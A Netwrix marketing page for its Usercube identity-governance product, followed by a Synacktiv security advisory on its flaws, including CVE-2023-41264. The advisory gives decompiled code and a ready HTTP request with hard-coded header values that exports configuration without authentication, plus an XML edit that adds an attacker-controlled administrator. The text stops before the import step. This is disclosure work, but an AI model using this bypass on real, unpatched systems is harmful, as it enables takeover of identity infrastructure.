=== Content from www.netwrix.com_1d5c10af_20250111_000633.html ===


Please note that it is recommended to turn **JavaScript** on for proper working of the Netwrix website.

[![Netwrix](//img.netwrix.com/elements/netwrix_logo.svg)](//www.netwrix.com/)

[Products](products.html)
Featured Products
[![Netwrix Auditor](//img.netwrix.com/products/icons/24/nwx-auditor.svg)
Netwrix Auditor
Identify IT risks, detect suspicious activity, and investigate security incidents.
Learn More](auditor.html)
[![Netwrix Enterprise Auditor](//img.netwrix.com/products/icons/24/nwx-stealthAUDIT.svg)
Netwrix Enterprise Auditor
Identify and reduce your risks around sensitive data.
Learn More](enterprise-auditor.html)

[![Netwrix Data Classification](//img.netwrix.com/products/icons/24/nwx-data-classification.svg)
Netwrix Data Classification
Discover and classify sensitive, regulated and mission-critical data.
Learn More](data_classification_software.html)
[![Netwrix GroupID](//img.netwrix.com/products/icons/24/nwx-group-id.svg)
Netwrix GroupID
Automate and delegate directory
group and user management.
Learn More](group_and_user_management_software.html)

[![Netwrix Privilege Secure](//img.netwrix.com/products/icons/24/nwx-sbPAM.svg)
Netwrix Privilege Secure
Secure privileged activity with
just-in-time access.
Learn More](privilege_secure.html)
[![Netwrix Endpoint Protector](//img.netwrix.com/products/icons/24/nwx-nep.svg)
Netwrix Endpoint Protector
Protect data from loss and malicious exfiltration across all endpoints.
Learn More](endpoint-dlp-solution.html)

[Discover the full Netwrix
portfolio. See all products](/products.html)

[UPCOMING PRODUCT DEMO

Minimize the Risk from Privileged with Activity Netwrix Privilege Secure

13 January, 9am GMT

Register Now](webinars.html?webinar_id=1067×lot=1736758800&from=menu)

[Solutions](solutions.html)
## DATA SECURITY

* [Data Access Governance](data_access_governance.html)
* [Data Governance](information_governance_software.html)
* [Data Loss Prevention](data-loss-prevention-software.html)

## IDENTITY SECURITY

* [Privileged Access Management](privileged_account_manager.html)
* [Active Directory Security](active_directory_security_tools.html)
* [Identity Governance and
   Administration](iga-solution.html)
* [Password Security](enterprise-password-management-solution.html)
* [Identity Threat Detection &
   Response](itdr-solution.html)

## COMPLIANCE

* [Compliance Solutions](compliance_audit_solution.html)
* [CMMC](netwrix-cmmc-compliance.html)
* [ISO](ISO_IEC_Compliance.html)
* [HIPAA](HIPAA_Compliance.html)
* [NIST CSF](netwrix-nist-csf-compliance.html)
* [PCI DSS](netwrix-pci-dss-compliance.html)
* [NIS2](netwrix-nis2-compliance.html)
* [GDPR](GDPR_Compliance.html)
* [CAF](netwrix-caf-compliance.html)

[Demo](one-to-one.html)
[Pricing](how_to_buy.html)
[Partners](netwrix_partner_program.html)

* [Become a Partner](partner_registration.html)
* [Partner Portal](https://www.netwrix.com/par/site/login)
* [MSPs](managed_service_provider_software.html)
* [Technology Partners](strategic_partnerships.html)
* [Partner Locator](resellers_and_distributors.html)

[Customers](support.html)
## SUPPORT

* [Support Portal](support.html)
* [Knowledge Center](https://helpcenter.netwrix.com)
* [Submit Ticket](tickets.html)

* [Support Program](support.html#SupportGuide)
* [Supported Versions](supported_versions.html)

## CUSTOMERS

* [Customer Portal](my_products.html)
* [Customer Training](customer_training.html)
* [Renew License](renew_maintenance.html)

* [Professional Services](professional_services.html)
* [Customer Webinars](webinars.html)
* [Customer Case Stories](customer_case_studies.html)

## MISCELLANEOUS

* [Security Center](https://security.netwrix.com/Account/SignIn)

[Resources](visibility_academy.html)

* [Webinars](webinars.html)
* [AD Risk Indicators](active_directory_risk_review.html)
* [Attack Catalog](attack.html)
* [How-to Guides](how_to_guides.html)
* [eBooks & Guides](white_papers.html)
* [SysAdmin Magazine](sysadmin_magazine.html)
* [Cyber Chief Magazine](cyberchief_magazine.html)
* [Research](netwrix_researches_for_it_pros.html)
* [Customer Case
  Studies](customer_case_studies.html)
* [Blog](https://blog.netwrix.com/)

Company

* [About Us](company.html)
* [Careers](careers.html)
* [Management Team](netwrix_leadership.html)
* [Customers](our_customers.html)
* [Analyst Coverage](analyst_coverage_on_netwrix.html)
* [News](news.html)
* [Events](events.html)
* [Contact Us](contact.html)

![Search](//img.netwrix.com/elements/layout/search.v001.svg)

![Search](//img.netwrix.com/elements/layout/search.v001.svg)
×

![Select language](//img.netwrix.com/elements/layout/language.svg)

- English
- [Deutsch](https://www.netwrix.de/)
- [Français](https://www.netwrix.fr/)
- [Italiano](https://www.netwrix.it/)
- [Español](https://www.netwrix.es/)

[![My account](//img.netwrix.com/elements/layout/user.svg)](sign_in.html)
[![My account](//img.netwrix.com/elements/layout/user.svg)

Sign In](sign_in.html)

Contact Our Experts
×

Contact Our Experts

This form is for product inquires only. For support, visit the [Support Portal.](/support.html)

{{ firstError }}

User Type
End User
MSP
Reseller

Number of Employees
1 - 150
151 - 500
501 - 2,000
2,001 - 7,500
7,501 - 25,000
More than 25,000

We care about security of your data.

[Privacy Policy](/privacy.html)

* ![Select language](//img.netwrix.com/elements/layout/language.svg)
  English
  + English
  + [Deutsch](https://www.netwrix.de/)
  + [Français](https://www.netwrix.fr/)
  + [Italiano](https://www.netwrix.it/)
  + [Español](https://www.netwrix.es/)
* ![Search](//img.netwrix.com/elements/layout/search.v001.svg)
  Search

  ![Icon search](//img.netwrix.com/elements/layout/search.v001.svg)
  ×
* [![Sign In](//img.netwrix.com/elements/layout/sign_out.svg)
  Sign In](./sign_in.html)
* [Home](/)
* Products
  Featured Products+ [![Netwrix Auditor](//img.netwrix.com/products/icons/24/nwx-auditor.svg)
    Netwrix Auditor
    Identify IT risks, detect suspicious activity, and investigate security incidents.
    Learn More](auditor.html)
  + [![Netwrix Data Classification](//img.netwrix.com/products/icons/24/nwx-data-classification.svg)
    Netwrix Data Classification
    Discover and classify sensitive, regulated and mission-critical data.
    Learn More](data_classification_software.html)
  + [![Netwrix Privilege Secure](//img.netwrix.com/products/icons/24/nwx-sbPAM.svg)
    Netwrix Privilege Secure
    Secure privileged activity with
    just-in-time access.
    Learn More](privilege_secure.html)
  + [Discover the full Netwrix portfolio.
     See all
    products](/products.html)
* Solutions
  + Data Security
    - [![Data Access Governance](//img.netwrix.com/elements/menu_icons/dag.svg)](data_access_governance.html)
    - [![Data Governance](//img.netwrix.com/elements/menu_icons/dg.svg)](information_governance_software.html)
    - [![Data Loss Prevention](//img.netwrix.com/elements/menu_icons/dlp.svg)](data-loss-prevention-software.html)
  + Identity Security
    - [![Privileged Access Management](//img.netwrix.com/elements/menu_icons/pam.svg)](privileged_account_manager.html)
    - [![Active Directory Security](//img.netwrix.com/elements/menu_icons/ads.svg)](active_directory_security_tools.html)
    - [![Identity Governance and Administration](//img.netwrix.com/elements/menu_icons/iam.svg)](iga-solution.html)
    - [![Password Security](//img.netwrix.com/elements/menu_icons/PSS.svg)](enterprise-password-management-solution.html)
    - [![Identity Threat Detection & Response](//img.netwrix.com/elements/menu_icons/itdr.svg)](itdr-solution.html)
  + Compliance
    - [![Compliance Solutions](//img.netwrix.com/elements/menu_icons/compl.svg)](compliance_audit_solution.html)
    - [![CMMC](//img.netwrix.com/elements/menu_icons/cmmc.svg)](netwrix-cmmc-compliance.html)
    - [![NIST CSF](//img.netwrix.com/elements/menu_icons/nist.svg)](netwrix-nist-csf-compliance.html)
    - [![ISO](//img.netwrix.com/elements/menu_icons/iso.svg)](ISO_IEC_Compliance.html)
    - [![PCI DSS](//img.netwrix.com/elements/menu_icons/pci.svg)](netwrix-pci-dss-compliance.html)
    - [![HIPAA](//img.netwrix.com/elements/menu_icons/hipaa.svg)](HIPAA_Compliance.html)
    - [![NIS2](//img.netwrix.com/elements/menu_icons/dg.svg)](netwrix-nis2-compliance.html)
    - [![GDPR](//img.netwrix.com/elements/menu_icons/gdpr.svg)](GDPR_Compliance.html)
    - [![CAF](//img.netwrix.com/elements/menu_icons/secCenter.svg)](netwrix-caf-compliance.html)
* [Demo](./one-to-one.html)
* [Pricing](./how_to_buy.html)
* [Partners](netwrix_partner_program.html)
  + [Become a Partner](partner_registration.html)
  + [Partner Portal](https://www.netwrix.com/par/site/login)
  + [MSPs](managed_service_provider_software.html)
  + [Technology Partners](strategic_partnerships.html)
  + [Partner Locator](resellers_and_distributors.html)
* Customers
  + Support
    - [![Support Portal](//img.netwrix.com/elements/menu_icons/sPortal.svg)](support.html)
    - [![Knowledge Center](//img.netwrix.com/elements/menu_icons/kCenter.svg)](https://helpcenter.netwrix.com)
    - [![Submit Ticket](//img.netwrix.com/elements/menu_icons/st.svg)Submit Ticket](tickets.html)
    - [![Support Program](//img.netwrix.com/elements/menu_icons/sp.svg)Support Program](support.html#SupportGuide)
    - [![Supported Versions](//img.netwrix.com/elements/menu_icons/suppvers.svg)Supported Versions](supported_versions.html)
  + Customers
    - [![Customer Portal](//img.netwrix.com/elements/menu_icons/customer-portal.svg)Customer Portal](my_products.html)
    - [![Customer Training](//img.netwrix.com/elements/menu_icons/customer-training.svg)Customer Training](customer_training.html)
    - [![Renew License](//img.netwrix.com/elements/menu_icons/review-license.svg)Renew License](renew_maintenance.html)
    - [![Professional Services](//img.netwrix.com/elements/menu_icons/profService.svg)Professional Services](professional_services.html)
    - [![Customer Webinars](//img.netwrix.com/elements/menu_icons/customer-webinars.svg)Customer Webinars](webinars.html)
    - [![Customer Case Stories](//img.netwrix.com/elements/menu_icons/ccs.svg)Customer Case Stories](customer_case_studies.html)
  + Miscellaneous
    - [![Security Center](//img.netwrix.com/elements/menu_icons/secCenter.svg)Security Center](https://security.netwrix.com/Account/SignIn)
* Resources
  + [Resources](visibility_academy.html)
  + [Webinars](webinars.html)
  + [AD Risk Indicators](active_directory_risk_review.html)
  + [Attack Catalog](attack.html)
  + [How-to Guides](how_to_guides.html)
  + [eBooks & Guides](white_papers.html)
  + [SysAdmin Magazine](sysadmin_magazine.html)
  + [Cyber Chief Magazine](cyberchief_magazine.html)
  + [Research](netwrix_researches_for_it_pros.html)
  + [Customer Case Studies](customer_case_studies.html)
  + [Blog](https://blog.netwrix.com/)
* Company
  + [About Us](company.html)
  + [Careers](careers.html)
  + [Management Team](netwrix_leadership.html)
  + [Customers](our_customers.html)
  + [Analyst Coverage](analyst_coverage_on_netwrix.html)
  + [News](news.html)
  + [Events](events.html)
  + [Contact Us](contact.html)

Go Up

[![logo](//img.netwrix.com/elements/netwrix_logo.svg)](//www.netwrix.com/)

1. [Home](https://www.netwrix.com/)
2. [Products](https://www.netwrix.com/products.html)
3. Netwrix Usercube

NETWRIX USERCUBE
Secure your Identities to Secure Your Data
[Launch In-Browser Demo](https://www.netwrix.com/netwrix-usercube-product-tour.html)
No need to deploy the product

Schedule One-to-One Demo
×

Schedule One-to-One Demo

{{ firstError }}

User Type
End User
MSP
Reseller

Number of Employees
1 - 150
151 - 500
501 - 2,000
2,001 - 7,500
7,501 - 25,000
More than 25,000

We care about security of your data.

[Privacy Policy](/privacy.html)

×

See Netwrix Usercube in Action

# SaaS-based IGA solution to automate, govern and control your enterprise identities

Usercube provides identity governance and administration (IGA) aimed squarely at solving the security, compliance and productivity issues associated with joiners, movers and leavers. By automating this challenging problem with a fully-SaaS solution, organizations can rest easier knowing that users are productive sooner, data is secured faster and auditors are thrilled with both.

Ensure users have the right access to the right things at the right timeEnable business owners, not IT, to grant accessSecure data by deprovisioning leavers in minutesThrill your auditorsEnsure users have the right access to the right things at the right timeEnhance security and accountability by ensuring only the right people have the right access to the right stuff and for only the right amount of time.![Image](https://img.netwrix.com/elements/webpage/screenshots/3_1658413292.jpg)Ensure users have the right access to the right things at the right timeEnhance security and accountability by ensuring only the right people have the right access to the right stuff and for only the right amount of time.Enable business owners, not IT, to grant accessGone are the days when IT was called upon to provide access to random SharePoint sites, file servers or VPNs. With Usercube’s access request portal, users can request access directly and the business owner who knows if the user should be granted that access can provide it – all without the assistance of IT.![Image](https://img.netwrix.com/elements/webpage/screenshots/4_1658413298.jpg)Enable business owners, not IT, to grant accessGone are the days when IT was called upon to provide access to random SharePoint sites, file servers or VPNs. With Usercube’s access request portal, users can request access directly and the business owner who knows if the user should be granted that access can provide it – all without the assistance of IT.Secure data by deprovisioning leavers in minutesSecure your data and infrastructure by ensuring that the access of any employee leaving the company is cut off within minutes of the employee’s departure.![Image](https://img.netwrix.com/elements/webpage/screenshots/5_1658413326.png)Secure data by deprovisioning leavers in minutesSecure your data and infrastructure by ensuring that the access of any employee leaving the company is cut off within minutes of the employee’s departure.Thrill your auditors with automated attestation campaigns and compliance reportsAuditors will be thrilled with the results of Usercube’s automated attestation campaigns which will provide both a summary and detailed highlight of who has access to what… and why.![Image](https://img.netwrix.com/elements/webpage/screenshots/2_1658413333.jpg)Thrill your auditors with automated attestation campaigns and compliance reportsAuditors will be thrilled with the results of Usercube’s automated attestation campaigns which will provide both a summary and detailed highlight of who has access to what… and why.
## Unlock the full potential of your identity management

![Feature Icon 0](//img.netwrix.com/elements/overview/feature_icons/get_to_secure_faster.svg)Ensure digital trustIGA brings together all of your organization’s processes to enable each identified individual to have the correct access rights at the right time for the right reasons.![Feature Icon 1](//img.netwrix.com/elements/overview/feature_icons/pass_security_compliance_audits.svg)Create your data repositoryNetwrix Usercube builds a repository of organizations, sites, users and resources, from different sources, to become the centralized location for reliable and exhaustive information.![Feature Icon 2](//img.netwrix.com/elements/overview/feature_icons/look_back_in_time.svg)Inform the right people in real timeMake sure every department is aware about the latest organizational changes. Ensure traceability and compliance.![Feature Icon 3](//img.netwrix.com/elements/overview/feature_icons/granular_rollback .svg)Build custom workflowsEach user can make a request to obtain, modify or revoke access rights or equipment for the users in their scope. Workflows enable you to push the request to the appropriate people in order to obtain approval and/or start processing the request as soon as possible.![Feature Icon 4](//img.netwrix.com/elements/overview/feature_icons/real-time_alerting.svg)Detect changes in real timeNetwrix Usercube detects changes in user or resource repositories and triggers workflows for creating, modifying, archiving or deleting data. This reconciliation can be done in real time or in a programmed manner.![Feature Icon 5](//img.netwrix.com/elements/overview/feature_icons/empower_users_to_focus_on_their_jobs.svg)Certify access rightsNetwrix Usercube enables compliance verification of access rights granted based on rules in place for your organization. Access rights previously granted are collected and analyzed, which enables you to immediately identify gaps between your expectations and reality.![Feature Icon 6](//img.netwrix.com/elements/overview/feature_icons/clean.svg)Limit profile sprawlNetwrix Usercube provides a comprehensive role-based model that defines user rights based on their identity, job functions and location.![Feature Icon 7](//img.netwrix.com/elements/overview/feature_icons/create_powerful_yet_flexible_password_policies.svg)Verify unauthorized access rightsNetwrix Usercube makes it possible to enumerate the IT system’s Security Policy regarding access right controls and can automate the deployment of these controls. Your organization is thus protected from security breaches including breaches related to the segregation of duties.![Feature Icon 8](//img.netwrix.com/elements/overview/feature_icons/respond_to_auditors.svg)Generate on-demand reportsEasily initialize the Netwrix Usercube data repository and track data over time. Prebuilt reports, available in Excel, give complete information about users, organizational structures, IT and physical access rights. You can organize your own report library related to different business areas (HR, IT Security, Governance, etc.)Show the full list of featuresFull list of features‹Hide the full list of featuresHide the full list‹![](https://img.netwrix.com/elements/webpage/covers/220x284_Banner_KuppingerCole_1676461085.png)analyst reportIdentity Governance and Administration Leadership Compass by KuppingerColeNetwrix has been recognized as a Product Leader, Innovation Leader, Market Leader and Overall Leader in the IGA market.[Get report](https://www.netwrix.com/identity_governance_and_administration_leadership_compass.html)![](https://img.netwrix.com/elements/webpage/covers/Cover_Image2.png)DATASHEETNetwrix UsercubeFind out how Netwrix can help you secure your identities.[Download Datasheet (.pdf)](https://www.netwrix.com/download/documents/Netwrix_Usercube_Datasheet.pdf)
## See how Netwrix Usercube compares to other solutions

Considering One Identity Manager?See a quick overview of the key differences and considerations between Netwrix and One Identity.[Compare](https://www.netwrix.com/one-identity-manager-vs-netwrix-iga-solution.html)

×
Solutions

* [Data Access Governance](./data_access_governance.html)
* [Ransomware Protection](./ransomware_protection_solution.html)
* [Privileged Access Management](./privileged_account_manager.html)
* [Active Directory Security](./active_directory_security_tools.html)
* [Identity Threat Detection & Response](./itdr-solution.html)
* [Identity Governance and Administration](./iga-solution.html)
* [Password Security](./enterprise-password-management-solution.html)
* [Data Governance](./information_governance_software.html)
* [Data Loss Prevention](./data-loss-prevention-software.html)
* [Data Security Platform](./data_security_software.html)
* [Audit and Compliance](./compliance_audit_solution.html)
* [eDiscovery](./ediscovery_software.html)
* [Records Management](./records_management_software.html)

Freeware

* [Top 7 Free Tools](./top_7_freeware_tools.html)
* [Account Lockout Examiner](./account_lockout_examiner.html)
* [Netwrix Auditor Free Community Edition](./free_community_edition.html)
* [All Free Tools](./freeware_tools.html)
* [Add-on Store](./netwrix_addons.html)

Support

* [Renew License](./renew_maintenance.html)
* [Submit a Ticket](./tickets.html)
* [Knowledge Center](https://helpcenter.netwrix.com)
* [Customer Portal](./my_account.html)
* [Supported Versions](./supported_versions.html)

Company

* [About Us](./company.html)
* [Careers](./careers.html)
* [Management Team](./netwrix_leadership.html)
* [Customers](./our_customers.html)
* [Analyst Coverage](./analyst_coverage_on_netwrix.html)
* [News](./news.html)
* [Events](./events.html)
* [Contact Us](./contact.html)

© 2025 Netwrix Corporation
[Privacy Policy](/privacy.html)
[EU Privacy Policy](/privacy_eu.html)
[EULA](/eula.html)
[Modern Slavery Statement](https://www.netwrix.com/download/documents/Modern_Slavery_Policy.pdf)

**Corporate Headquarters:** 6160 Warren Parkway,

 Suite 100, Frisco, TX, US 75034

**Phone:** 1-949-407-5125 | **Toll-free:** 888-638-9749

[![LinkedIn](//img.netwrix.com/elements/icons/socials/blog/linkedIn.svg)](https://www.linkedin.com/company/455932/)
[![Twitter](//img.netwrix.com/elements/icons/socials/blog/twitter.svg)](https://twitter.com/netwrix)
[![Facebook](//img.netwrix.com/elements/icons/socials/blog/facebook.svg)](https://www.facebook.com/Netwrix)
[![Youtube](//img.netwrix.com/elements/icons/socials/blog/youtube.v001.svg)](https://www.youtube.com/Netwrix)
[![Spiceworks](//img.netwrix.com/elements/icons/socials/blog/spiceworks.svg)](https://community.spiceworks.com/pages/NetWrix)
[![Instagram](//img.netwrix.com/elements/icons/socials/blog/instagram.v001.svg)](https://www.instagram.com/netwrix/)



=== Content from www.synacktiv.com_eb155fc7_20250111_000633.html ===

[Aller au contenu principal](usercube-netwrix-multiple-vulnerabilities#main-content)
 [Rechercher](../search)
Switch Language

FRToggle Dropdown

* FR
* [EN](../en/advisories/usercube-netwrix-multiple-vulnerabilities)

* [RSS](/en/feed/lastblog.xml)
* [Github](https://github.com/Synacktiv)
* [Twitter](https://twitter.com/synacktiv)
* [Linkedin](https://fr.linkedin.com/company/synacktiv)

[![Accueil](../sites/default/files/logo_synacktiv_blanc.png)](../index "Accueil")

* [Notre Offre](../notre-offre)
  + [Test dâintrusion / Red Team](../prestations/test-dintrusionred-team)
  + [RÃ©ponse aux incidents](../prestations/reponse-aux-incidents)
  + [Formations](../offres/formations)
  + [Reverse-engineering](../prestations/reverse-engineering)
  + [DÃ©veloppement](../notre-equipe/developpement)
  + [Produits](../produits/kraqozorus)
  + [CSIRT](../csirt)
* [Nous rejoindre](../nous-rejoindre)
* [Publications](../nos-publications)
  + [Articles](../publications)
  + [Avis de sÃ©curitÃ©](../advisories)
  + [Ressources](../ressources)
* [La sociÃ©tÃ©](../la-societe)
* [Contact](../contact)

* [Articles](../publications)
* [Avis de sÃ©curitÃ©](../advisories)
* [Ressources](../ressources)

* [RSS](/en/feed/lastblog.xml)
* [Github](https://github.com/Synacktiv)
* [Twitter](https://twitter.com/synacktiv)
* [Linkedin](https://fr.linkedin.com/company/synacktiv)

![](../sites/default/files/2023-06/synacktiv-logo-noir.svg)
# Usercube (Netwrix) - Multiple vulnerabilities

28/11/2023
- [TÃ©lÃ©chargement](usercube-netwrix-multiple-vulnerabilities)

Product

Usercube

Severity

Critical

Fixed Version(s)

6.0.215

Affected Version(s)

<= 6.0.204

CVE Number

CVE-2023-41264

Authors

Julien Egloff

Antoine Carrincazeaux

## Description

### Presentation

[Usercube](https://www.netwrix.com/identity_governance_and_administration_solution.html) provides identity governance and administration (IGA) aimed squarely at solving the security, compliance and productivity issues associated with joiners, movers and leavers. By automating this challenging problem with a fully-SaaS solution, organizations can rest easier knowing that users are productive sooner, data is secured faster and auditors are thrilled with both.

### Issue(s)

Multiple issues were identified on the on-premise version of the product:

* An authentication bypass on deployment endpoints (CVE-2023-41264).
* Presence of a hard-coded secret inside the compiled .NET libraries.
* An authentication cookie having a long lifetime when using an external identity provider.

These issues might also apply to the SaaS variant of the product but were not tested.

### Timeline

| Date | Description |
| --- | --- |
| 2023.08.07 | Advisory sent to productsecurity@netwrix.com |
| 2023.08.07 | Editor acknowledged the reception of the advisory |
| 2023.08.30 | Netwrix answers that vulnerability #1 was already discovered internally, second vulnerability is not considered a security risk and third vulnerability fix is going to be released soon |
| 2023.09.27 | Netwrix published its own advisory to its customers |
| 2023.11.28 | Public release |

Â

## Technical details

![](../index.html)

### Authentication bypass on deployment endpoints (CVE-2023-41264)

#### Description

The application exposes deployment endpoints:

* POST `/api/Deployment/ExportConfiguration`
* POST `/api/Deployment`

Both of them require authentication based on a custom mechanism, as shown by the following decompiled code from `Usercube-Server.dll` (`DeploymentController.cs`):

```

[ApiVersion("1.0")]
[AllowAnonymous]
[HttpPost]
public IActionResult Post([FromForm] IFormFile file)
{
	ValueTuple<ConfigurationContext, string, string, string, string, string, string, ValueTuple<string>> elements = ConfigurationService.GetElements(this.hostEnvironment, base.HttpContext);
	ConfigurationContext item = elements.Item1;
	string item2 = elements.Item2; // X-Usercubeauthorization header
	string item3 = elements.Item3; // Authorization header
	string item4 = elements.Item4; // X-Usercubelegacy header
	string item5 = elements.Item5; // environmentname
	string item6 = elements.Item6; // deployment-slot header
	string item7 = elements.Item7; // Host header
	string item8 = elements.Rest.Item1; // tenant header
	this.FillContext(item);
	JwtSecurityTokenHandler tokenHandler = new JwtSecurityTokenHandler();
	OpenIdTokenValidationProvider tokenValidationProvider = new OpenIdTokenValidationProvider();
	return this.ValidateRequestAndDeploy(item, item2, item3, item4, item5, item6, item7, item8, tokenHandler, tokenValidationProvider, file);
}

[ApiVersion("1.0")]
[AllowAnonymous]
[Route("ExportConfiguration")]
[HttpPost]
public IActionResult ExportConfiguration()
{
	ValueTuple<ConfigurationContext, string, string, string, string, string, string, ValueTuple<string>> elements = ConfigurationService.GetElements(this.hostEnvironment, base.HttpContext);
	ConfigurationContext item = elements.Item1;
	string item2 = elements.Item2; // X-Usercubeauthorization header
	string item3 = elements.Item3; // Authorization header
	string item4 = elements.Item4; // X-Usercubelegacy header
	string item5 = elements.Item5; // environmentname
	string item6 = elements.Item6; // deployment-slot header
	string item7 = elements.Item7; // Host header
	string item8 = elements.Rest.Item1; // tenant header
	item.MarkExport = base.HttpContext.Request.Query.ContainsKey(ConfigurationConstants.MarkExport);
	item.MarkExportRoleModel = base.HttpContext.Request.Query.ContainsKey(ConfigurationConstants.MarkRoleModelExport);
	item.HandleProductTranslation = base.HttpContext.Request.Query.ContainsKey(ConfigurationConstants.HandleProductTranslation);
	JwtSecurityTokenHandler tokenHandler = new JwtSecurityTokenHandler();
	OpenIdTokenValidationProvider tokenValidationProvider = new OpenIdTokenValidationProvider();
	string value;
	bool isLegacyAuth;
	if (ConfigurationService.TryGetAuthenticationError(item2, item3, item4, this.resetSettings, tokenHandler, tokenValidationProvider, this.logger, item5, out value, out isLegacyAuth))
	{
		return this.Unauthorized(value);
	}
	this.LogConfigurationRequestApproval(isLegacyAuth, tokenHandler, item3, true);
	ValueTuple<string, string, int> valueTuple = this.configurationManager.Export(this.resetSettings, this.dbConfig, this.loggerTaskSettings, item);
	string item9 = valueTuple.Item1;
	string item10 = valueTuple.Item2;
	int item11 = valueTuple.Item3;
	if (item11 != 0)
	{
		this.logger.LogError("{Output}", new object[]
		{
			item9
		});
		return this.BadRequest(item9);
	}
	this.logger.LogInformation("Configuration successfully exported", Array.Empty<object>());
	Stream stream = this.fileFacade.GetStream(item10, FileMode.Open, FileAccess.Write, FileShare.None);
	base.Response.Headers.Add("content-disposition", "attachment; filename=" + Path.GetFileName(item10));
	return this.File(stream, "application/zip", Path.GetFileName(item10));
}
```

The functions related to authentication are located in the `ConfigurationService.cs` file:

```

internal static bool TryGetAuthenticationError([Nullable(2)] string secret, [Nullable(2)] string idTokenAsString, [Nullable(2)] string oldAuthHeader, ResetSettings resetSettings, JwtSecurityTokenHandler tokenHandler, ITokenValidationProvider tokenValidationProvider, ILogger logger, string environment, [Nullable(2)] [NotNullWhen(true)] out string errorMessage, out bool isLegacyAuth)
{
    isLegacyAuth = false;
    if (secret != "9kltub854rd36421uty5846hgdqdf")
    {
        errorMessage = ConfigurationConstants.InvalidUsercubeHeaderValueErrorMessage;
        logger.LogError("Unauthorized Operation - Invalid Usercube Header on environment {environment}", new object[]
        {
            environment
        });
        return true;
    }
    List<ValueTuple<LogLevel, string>> list = new List<ValueTuple<LogLevel, string>>();
    string str;
    if (!ConfigurationService.TryGetOpenIdTokenError(idTokenAsString, resetSettings, tokenHandler, tokenValidationProvider, list, out str))
    {
        errorMessage = null;
        return false;
    }
    isLegacyAuth = ConfigurationService.TryValidateOldAuth(oldAuthHeader, resetSettings);
    if (isLegacyAuth)
    {
        logger.LogInformation("Configuration Deployment: Legacy authentication success.", Array.Empty<object>());
    errorMessage = null;
        return false;
    }
    errorMessage = ConfigurationConstants.InvalidOpenIdTokenErrorMessage + str;
    string message = "Unauthorized Operation - Invalid Open ID Connect token ({logs}) on environment {environment}";
    object[] array = new object[2];
    array[0] = (from t in list
    select t.Item2).ToList<string>();
    array[1] = environment;
    logger.LogError(message, array);
    return true;
}
[...]

private static bool TryValidateOldAuth([Nullable(2)] string oldAuthHeader, ResetSettings resetSettings)
{
    if (oldAuthHeader == null)
    {
        oldAuthHeader = string.Empty;
    }
    string[] source = oldAuthHeader.Split('|', StringSplitOptions.None);
    string      = source.ElementAtOrDefault(0) ?? string.Empty;
    string b2 = source.ElementAtOrDefault(1) ?? string.Empty;
    SHA512 sha = SHA512.Create();
    string a = Convert.ToHexString(sha.ComputeHash(Encoding.UTF8.GetBytes(resetSettings.AuthorizedClientId)));
    string a2 = Convert.ToHexString(sha.ComputeHash(Encoding.UTF8.GetBytes(resetSettings.AuthorizedClientSecret)));
    return string.Equals(a, b, StringComparison.Ordinal) && string.Equals(a2, b2, StringComparison.Ordinal);
}
```

The previous code performs the following checks:

* The `X-Usercubeauthorization` HTTP header must be present and equal to `9kltub854rd36421uty5846hgdqdf`.
* If the `Authorization` header is present and valid (`TryGetOpenIdTokenError` function), the user is authenticated. If not, the execution continues.
* If the `X-Usercubelegacy` header is present and valid (`TryValidateOldAuth` function), the user is authenticated.

Therefore, if one of the `TryGetOpenIdTokenError` or `TryValidateOldAuth` functions returns `true`, the user is authenticated and can access the deployment endpoints.

The `TryValidateOldAuth` function checks the presence of the `X-Usercubelegacy` HTTP header and splits its content in two parts surrounding the `|` character. Then, both values are compared with the SHA512 hashes of the `restSettings.AuthorizedClientId` and `restSettings.AuthorizedSecret` values. However, if these keys are not set in the application's configuration, the computed hashes both correspond to the SHA512 hash of an empty string, which is a constant value. Furthermore, these specific settings do not seem to be documented by Netwrix, and the default `appsettings.json` configuration file does not include the corresponding keys.

It is therefore possible to export and import the application's configuration without prior authentication, using the constant values of the `X-Usercubeauthorization` and `X-Usercubelegacy` headers, without any additional information.

The following request can be performed to export the configuration:

```

POST /api/Deployment/ExportConfiguration?api-version=1.0&vary=en-US HTTP/1.1
Host: usercube.local:5000
X-Usercubeauthorization: 9kltub854rd36421uty5846hgdqdf
X-Usercubelegacy: CF83E1357EEFB8BDF1542850D66D8007D620E4050B5715DC83F4A921D36CE9CE47D0D13C5D85F2B0FF8318D2877EEC2F63B931BD47417A81A538327AF927DA3E|CF83E1357EEFB8BDF1542850D66D8007D620E4050B5715DC83F4A921D36CE9CE47D0D13C5D85F2B0FF8318D2877EEC2F63B931BD47417A81A538327AF927DA3E
Content-Length: 0

HTTP/1.1 200 OK
Content-Length: 7526
Content-Type: application/zip
Cache-Control: no-store,no-cache
Pragma: no-cache
Content-Disposition: attachment; filename=rcnml3mf.k2l; filename*=UTF-8''rcnml3mf.k2l

PK[...]
```

Â

#### Impact

After exporting the configuration, it can be modified and re-imported in order to, for example:

* Add an arbitrary `OpenIdClient` with the highest privileges on the application.
* Alter existing profiles to increase privileges of an existing user.
* Modify the `ApplicationName` key in the `Settings.xml` to execute arbitrary JavaScript in user's browsers.
* Perform Denial of Service attacks by altering or destroying parts of the configuration.

As an example, the `OpenIdClient.xml` file can be modified to add a new user as follows:

```

<ConfigurationFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns="urn:schemas-usercube-com:configuration">
  <OpenIdClient Identifier="Job" DisplayName_L1="Default Client for jobs" HashedSecret="2Xqhxl9P1DmLjZQmir5RTzFxh4/vIICmuzVPdrwEM3o=" Profile="Administrator" />
  <OpenIdClient Identifier="Synacktiv" DisplayName_L1="Attacker controlled administrator" HashedSecret="Ds+i73EcRZZXio3lBwPBiifY8SZUBLjz/NrZQ7HMgzA=" Profile="Administrator" />
</ConfigurationFile>
```

The `HashedSecret` is aÂ Base64-encoded SHA256 digest and can be computed with the following command line:

```

$ echo -n 'synacktiv' | sha256sum | cut -d ' ' -f1 | xxd -r -ps | base64
Ds+i73EcRZZXio3lBwPBiifY8SZUBLjz/NrZQ7HMgzA=

```

Then the import functionality is used:

```

